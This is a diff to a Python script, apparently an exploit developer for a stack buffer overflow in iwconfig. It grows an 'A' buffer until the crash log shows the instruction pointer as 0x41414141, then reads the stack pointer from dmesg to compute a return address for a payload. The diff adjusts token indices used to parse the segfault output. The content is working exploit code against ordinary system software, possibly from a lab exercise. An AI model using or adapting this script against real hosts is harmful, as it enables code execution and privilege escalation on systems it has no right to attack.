@@ -24,6 +24,7 @@ while True:
     # return code when segfault on docker: -11
 
     if iwconfig.returncode == -11:
+
         # print(f"Segmentation fault occurred with buffer length: {len(buffer)}")
         dmesg_command = ["dmesg", "-T"]
         grep_command = ["grep", "segfault"]
@@ -36,9 +37,10 @@ while True:
         tail_output, _ = tail_process.communicate()
 
         dmesg_res = tail_output.decode().split(" ")
+        # print(dmesg_res[11])
         # ip is the 11th token (starting from 0), sp is the 13th
 
-        if dmesg_res[10] != "0000000041414141":
+        if dmesg_res[11] != "0000000041414141":
             buffer += b"A"
             command = ["iwconfig", buffer.decode()]
             continue
@@ -56,7 +58,7 @@ while True:
             tail_output2, _ = tail_process.communicate()
             dmesg2_res = tail_output2.decode().split(" ")
 
-            sp_hex = int(dmesg2_res[12], 16)
+            sp_hex = int(dmesg2_res[13], 16)
             ret_addr = sp_hex + 5000
 
             payload = b"A" * (len(buffer) - 4)
